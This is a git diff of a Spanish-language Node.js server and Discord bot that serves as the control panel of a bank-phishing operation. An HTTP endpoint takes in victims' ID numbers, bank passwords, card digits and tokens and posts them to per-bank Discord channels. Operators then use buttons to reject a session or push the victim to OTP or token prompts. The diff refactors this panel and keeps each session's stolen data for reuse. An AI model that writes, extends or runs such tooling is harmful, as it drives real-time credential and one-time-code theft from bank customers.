@@ -13,6 +13,8 @@ const HTTP_PORT = process.env.PORT || 3000;
 // ESTADO DE LAS SESIONES
 // ============================================
 const estadoSesiones = new Map();
+// Guardamos los datos completos de cada sesión para poder reusarlos al cambiar de embed
+const datosSesiones = new Map();
 
 // ============================================
 // CLIENTE DE DISCORD
@@ -32,6 +34,89 @@ client.once(Events.ClientReady, (c) => {
         console.log(`   - ${key} → ${banco.canalId}`);
     });
 });
+
+// ============================================
+// FUNCIONES AUXILIARES
+// ============================================
+
+// Construye el embed según el estado
+function buildEmbed(banco, bancoKey, datos, sessionId, estado) {
+    const { tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
+
+    let titulo = `${banco.nombre} - Nuevo registro`;
+    if (estado === 'otp') titulo = `${banco.nombre} - Verificación OTP`;
+    if (estado === 'token') titulo = `${banco.nombre} - Verificación Token`;
+
+    const embed = new EmbedBuilder()
+        .setTitle(titulo)
+        .setColor(banco.color)
+        .addFields(
+            { name: '🎫 Tipo', value: tipo || 'N/A', inline: false },
+            { name: '📋 Tipo doc', value: tipoDoc || '(no seleccionado)', inline: true },
+            { name: '🪪 Identificación', value: identificacion || '(vacío)', inline: true }
+        );
+
+    if (clave) embed.addFields({ name: '🔑 Clave', value: clave, inline: true });
+    if (tarjeta) embed.addFields({ name: '💳 Últ. 4 dígitos', value: tarjeta, inline: true });
+    if (token) embed.addFields({ name: '🔐 Token', value: token, inline: false });
+
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
+    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
+
+    return embed;
+}
+
+// Construye los botones según el estado
+function buildButtons(bancoKey, sessionId, estado) {
+    if (estado === 'inicial') {
+        // 3 botones: Rechazar / OTP / Token
+        return new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+                .setLabel('❌ Rechazar')
+                .setStyle(ButtonStyle.Danger),
+            new ButtonBuilder()
+                .setCustomId(`OTP|${bancoKey}|${sessionId}`)
+                .setLabel('📱 OTP')
+                .setStyle(ButtonStyle.Primary),
+            new ButtonBuilder()
+                .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
+                .setLabel('🔢 Token')
+                .setStyle(ButtonStyle.Success)
+        );
+    }
+
+    if (estado === 'otp') {
+        // 2 botones: Rechazar / Token
+        return new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+                .setLabel('❌ Rechazar')
+                .setStyle(ButtonStyle.Danger),
+            new ButtonBuilder()
+                .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
+                .setLabel('🔢 Token')
+                .setStyle(ButtonStyle.Success)
+        );
+    }
+
+    if (estado === 'token') {
+        // 2 botones: Rechazar / OTP
+        return new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+                .setLabel('❌ Rechazar')
+                .setStyle(ButtonStyle.Danger),
+            new ButtonBuilder()
+                .setCustomId(`OTP|${bancoKey}|${sessionId}`)
+                .setLabel('📱 OTP')
+                .setStyle(ButtonStyle.Primary)
+        );
+    }
+
+    return null;
+}
 
 // ============================================
 // SERVIDOR HTTP
@@ -60,7 +145,7 @@ const server = http.createServer(async (req, res) => {
         req.on('end', async () => {
             try {
                 const datos = JSON.parse(body);
-                const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
+                const { sessionId } = datos;
 
                 if (!sessionId) {
                     res.writeHead(400, { 'Content-Type': 'application/json' });
@@ -69,46 +154,12 @@ const server = http.createServer(async (req, res) => {
                 }
 
                 estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datos);
+
                 console.log(`📥 [${bancoKey}] Nueva sesión: ${sessionId}`);
 
-                const embed = new EmbedBuilder()
-                    .setTitle(`${banco.nombre} - Nuevo registro`)
-                    .setColor(banco.color)
-                    .addFields(
-                        { name: '🎫 Tipo', value: tipo || 'N/A', inline: false },
-                        { name: '📋 Tipo doc', value: tipoDoc || '(no seleccionado)', inline: true },
-                        { name: '🪪 Identificación', value: identificacion || '(vacío)', inline: true }
-                    );
-
-                if (clave) {
-                    embed.addFields({ name: '🔑 Clave', value: clave || '(vacío)', inline: true });
-                }
-                if (tarjeta) {
-                    embed.addFields({ name: '💳 Últ. 4 dígitos', value: tarjeta || '(vacío)', inline: true });
-                }
-                if (token) {
-                    embed.addFields({ name: '🔐 Token', value: token, inline: false });
-                }
-
-                const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
-                embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
-                embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
-
-                // 3 BOTONES: Rechazar, OTP, Token
-                const row = new ActionRowBuilder().addComponents(
-                    new ButtonBuilder()
-                        .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
-                        .setLabel('❌ Rechazar')
-                        .setStyle(ButtonStyle.Danger),
-                    new ButtonBuilder()
-                        .setCustomId(`OTP|${bancoKey}|${sessionId}`)
-                        .setLabel('📱 OTP')
-                        .setStyle(ButtonStyle.Primary),
-                    new ButtonBuilder()
-                        .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
-                        .setLabel('🔢 Token')
-                        .setStyle(ButtonStyle.Success)
-                );
+                const embed = buildEmbed(banco, bancoKey, datos, sessionId, 'inicial');
+                const row = buildButtons(bancoKey, sessionId, 'inicial');
 
                 const channel = await client.channels.fetch(banco.canalId);
                 await channel.send({ embeds: [embed], components: [row] });
@@ -178,25 +229,55 @@ client.on(Events.InteractionCreate, async (interaction) => {
     const sessionId = partes[2];
     const usuario = interaction.user.username;
 
+    const banco = bancos[bancoKey];
+    if (!banco) {
+        await interaction.reply({ content: '❌ Banco no válido', ephemeral: true });
+        return;
+    }
+
+    const datos = datosSesiones.get(sessionId) || {};
+
     if (accion === 'RECHAZAR') {
         estadoSesiones.set(sessionId, 'rechazado');
         console.log(`❌ [${bancoKey}] RECHAZADO: ${sessionId}`);
-        await interaction.reply({ content: `❌ Sesión **${sessionId}** RECHAZADA por ${usuario}` });
+
+        // Editar el embed para mostrar que fue rechazado
+        const embedRechazado = buildEmbed(banco, bancoKey, datos, sessionId, 'inicial')
+            .setTitle(`${banco.nombre} - ❌ Rechazado`)
+            .setColor(0xC20024);
+
+        await interaction.update({
+            content: `❌ Sesión **${sessionId}** rechazada por ${usuario}`,
+            embeds: [embedRechazado],
+            components: []
+        });
 
     } else if (accion === 'OTP') {
         estadoSesiones.set(sessionId, 'otp');
         console.log(`📱 [${bancoKey}] OTP: ${sessionId}`);
-        await interaction.reply({ content: `📱 Sesión **${sessionId}** enviada a OTP por ${usuario}` });
+
+        const embed = buildEmbed(banco, bancoKey, datos, sessionId, 'otp');
+        const row = buildButtons(bancoKey, sessionId, 'otp');
+
+        await interaction.update({
+            content: `📱 Sesión **${sessionId}** movida a OTP por ${usuario}`,
+            embeds: [embed],
+            components: [row]
+        });
 
     } else if (accion === 'TOKEN') {
         estadoSesiones.set(sessionId, 'token');
         console.log(`🔢 [${bancoKey}] TOKEN: ${sessionId}`);
-        await interaction.reply({ content: `🔢 Sesión **${sessionId}** enviada a TOKEN por ${usuario}` });
-    }
 
-    // Quitar los botones del mensaje
-    await interaction.message.edit({ components: [] });
+        const embed = buildEmbed(banco, bancoKey, datos, sessionId, 'token');
+        const row = buildButtons(bancoKey, sessionId, 'token');
+
+        await interaction.update({
+            content: `🔢 Sesión **${sessionId}** movida a TOKEN por ${usuario}`,
+            embeds: [embed],
+            components: [row]
+        });
+    }
 });
 
 client.login(TOKEN);
-// Redeploy 10/06/2026 17:14:10
